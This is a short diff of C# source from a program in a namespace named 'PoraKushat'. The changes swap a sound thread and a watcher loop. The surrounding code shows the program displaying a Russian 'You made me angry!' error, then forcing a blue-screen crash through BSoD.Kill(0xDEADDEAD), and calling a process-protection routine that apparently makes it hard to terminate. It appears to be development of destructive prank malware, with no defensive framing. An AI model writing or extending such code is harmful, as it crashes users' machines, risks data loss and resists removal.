@@ -50,7 +50,7 @@ namespace PoraKushat
             }
             else
             {
-                new Thread(BSoD.CurFun).Start();
+                new Thread(BSoD.Sounds).Start();
                 MessageBox.Show("Ты меня разозлил!", "", MessageBoxButtons.OK, MessageBoxIcon.Error);
                 BSoD.Kill(0xDEADDEAD);
             }
@@ -82,7 +82,7 @@ namespace PoraKushat
                 else if (args.Contains("noreboot") && !args.Contains("nobsod"))
                 {
                     ProcessProtection.Protect();
-                    while (true) { }
+                    Watcher.Watch2();
                 }
                 else if (!args.Contains("nobsod"))
                 {
@@ -121,7 +121,7 @@ namespace PoraKushat
                             }
                             else
                             {
-                                new Thread(BSoD.CurFun).Start();
+                                new Thread(BSoD.Sounds).Start();
                                 MessageBox.Show("Ты меня разозлил!", "", MessageBoxButtons.OK, MessageBoxIcon.Error);
                                 BSoD.Kill(0xDEADDEAD);
                             }
